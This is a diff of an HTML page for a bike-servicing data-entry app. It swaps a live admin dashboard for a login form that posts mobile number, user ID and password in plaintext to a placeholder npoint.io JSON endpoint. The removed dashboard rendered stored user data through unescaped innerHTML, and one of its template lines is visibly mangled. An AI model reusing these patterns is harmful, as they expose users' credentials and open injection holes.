@@ -1,141 +1,57 @@
 <!DOCTYPE html>
 <html lang="hi">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>•LIVE Admin</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <style>
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.35; }
-    }
-    .blink-dot {
-      animation: blink 1.3s infinite;
-      color: #dc2626; /* red-600 */
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bike Servicing - Login</title>
+    <style>
+        * { box-sizing: border-box; font-family: Arial; }
+        body { margin: 0; padding: 0; background: #f1f1f1; }
+        header { background: #333; color: white; padding: 15px; text-align: center; }
+        footer { background: #222; color: white; text-align: center; padding: 10px; position: fixed; bottom: 0; width: 100%; }
+        .form-container { max-width: 400px; margin: 80px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        input, button { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
+        button { background: #28a745; color: white; border: none; cursor: pointer; font-size: 16px; }
+        button:hover { background: #218838; }
+    </style>
 </head>
-<body class="bg-gray-50 min-h-screen text-gray-900">
+<body>
+    <header>
+        <h2>🏍️ Bike Servicing Data Entry</h2>
+    </header>
 
-  <!-- Header: Sirf •LIVE -->
-  <header class="bg-white shadow-sm sticky top-0 z-10">
-    <div class="max-w-5xl mx-auto px-4 py-5 flex justify-center items-center">
-      <h1 class="text-5xl font-black tracking-tight">
-        <span class="blink-dot">•</span>LIVE
-      </h1>
+    <div class="form-container">
+        <h3>Step 1: User Verification</h3>
+        <form id="loginForm">
+            <input type="text" id="mobile" placeholder="Mobile Number" required>
+            <input type="text" id="userid" placeholder="User ID (Offline Diya Gaya)" required>
+            <input type="password" id="password" placeholder="Password (Offline Diya Gaya)" required>
+            <button type="submit">Next</button>
+        </form>
     </div>
-  </header>
 
-  <!-- Main Content -->
-  <main class="max-w-5xl mx-auto px-4 py-8 sm:px-6 lg:px-8">
-    <div id="entries" class="space-y-6"></div>
+    <footer>
+        <p>© 2025 Bike Servicing System | Admin Access Only</p>
+    </footer>
 
-    <div id="empty" class="text-center py-20 text-gray-600">
-      <p class="text-2xl font-medium">कोई एंट्री अभी तक नहीं आई...</p>
-      <p class="mt-4 text-lg">नई सर्विसिंग डिटेल्स भरने के बाद यहाँ लाइव दिखेंगी</p>
-      <p class="mt-2 text-sm">(फॉर्म पूरा भरें, 2 सेकंड में रिफ्रेश होगा)</p>
-    </div>
-  </main>
-
-  <script>
-    // Fixed colors per mobile (hash se consistent)
-    const colors = [
-      'bg-pink-50 border-pink-400 text-pink-900',
-      'bg-gray-100 border-gray-500 text-gray-900',
-      'bg-blue-50 border-blue-400 text-blue-900',
-      'bg-green-50 border-green-400 text-green-900',
-      'bg-red-50 border-red-400 text-red-900',
-      'bg-yellow-50 border-yellow-500 text-yellow-900',
-      'bg-purple-50 border-purple-400 text-purple-900',
-      'bg-orange-50 border-orange-400 text-orange-900',
-      'bg-white border-gray-300 text-gray-900'
-    ];
-
-    function getColorForMobile(mobile) {
-      if (!mobile) return colors[8]; // white fallback
-      let hash = 0;
-      for (let i = 0; i < mobile.length; i++) {
-        hash = (mobile.charCodeAt(i) + ((hash << 5) - hash)) | 0;
-      }
-      return colors[Math.abs(hash) % colors.length];
-    }
-
-    function formatDate(iso) {
-      if (!iso) return '—';
-      return new Date(iso).toLocaleString('hi-IN', {
-        day: 'numeric', month: 'short', year: 'numeric',
-        hour: '2-digit', minute: '2-digit', hour12: true
-      });
-    }
-
-    function getStepName(type) {
-      const names = {
-        step1: '1. मोबाइल + यूजर आईडी',
-        oil: '2. ऑयल सीरियल नंबर',
-        oilbrand: '3. ऑयल ब्रांड + मॉडल',
-        panchar: '4. पंक्चर स्टाफ डिटेल्स',
-        oilfilter: '5. ऑयल फिल्टर नंबर'
-      };
-      return names[type] || type;
-    }
-
-    function renderEntries() {
-      // Abhi localStorage se (temporary) — real mein fetch('/api/submissions') use karo
-      const stored = localStorage.getItem('bikeServiceData');
-      let allData = stored ? [JSON.parse(stored)] : []; // abhi ek service = ek object
-
-      // Agar multiple entries hone lage (future), yeh sort karega newest first
-      allData.sort((a, b) => new Date(b.timestamp || 0) - new Date(a.timestamp || 0));
-
-      const container = document.getElementById('entries');
-      const emptyDiv = document.getElementById('empty');
-      container.innerHTML = '';
-
-      if (allData.length === 0 || !allData[0].mobile) {
-        emptyDiv.style.display = 'block';
-        return;
-      }
-
-      emptyDiv.style.display = 'none';
-
-      allData.forEach(item => {
-        const colorClass = getColorForMobile(item.mobile);
-        const latestTime = formatDate(item.timestamp || item.lastUpdated);
-
-        let html = `
-          <div class="rounded-2xl overflow-hidden shadow-md border-l-8 ${colorClass} transition-all hover:shadow-xl">
-            <div class="px-6 py-4 bg-white/70 border-b">
-              <div class="flex justify-between items-center">
-                <div>
-                  <p class="text-2xl font-bold">${item.mobile || '—'}</p>
-                  <p class="text-sm mt-1 opacity-80">${latestTime} • ${getStepName(item.currentStep || 'step1')}</p>
-                </div>
-                <span class="px-3 py-1 text-xs font-semibold rounded-full bg-white/80">
-                  ${item.currentStep ? 'स्टेप ' + (Object.keys(item).length - 3) : '1'}
-                </span>
-              </div>
-            </div>
-
-            <div class="p-6 space-y-4 text-sm">
-              ${item.userid ? `<div><strong>यूजर आईडी:</strong> ${item.userid}</div>` : ''}
-              ${item.oil_serial ? `<div><strong>ऑयल सीरियल:</strong> ${item.oil_serial}</div>` : ''}
-              ${item.brand_name ? `<div><strong>ब्रांड / मॉडल:</strong> ${item.brand_name} / ${item.model_no || '—'}</div>` : ''}
-              ${item.panchar_name ? `<div><strong>पंक्चर:</strong> \( {item.panchar_name} ( \){item.panchar_no || '—'})</div>` : ''}
-              ${item.oilfilter_no ? `<div><strong>ऑयल फिल्टर:</strong> ${item.oilfilter_no}</div>` : ''}
-            </div>
-          </div>
-        `;
-
-        container.insertAdjacentHTML('beforeend', html);
-      });
-    }
-
-    // Pehli baar load
-    renderEntries();
-
-    // Har 2 second auto refresh
-    setInterval(renderEntries, 2000);
-  </script>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            let data = {
+                mobile: document.getElementById('mobile').value,
+                userid: document.getElementById('userid').value,
+                password: document.getElementById('password').value,
+                step: 'login'
+            };
+            // Save to backend (simulate)
+            fetch('https://api.npoint.io/your-backend-endpoint', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).then(() => {
+                window.location.href = 'oil.html';  // Redirect to next step
+            });
+        });
+    </script>
 </body>
 </html>
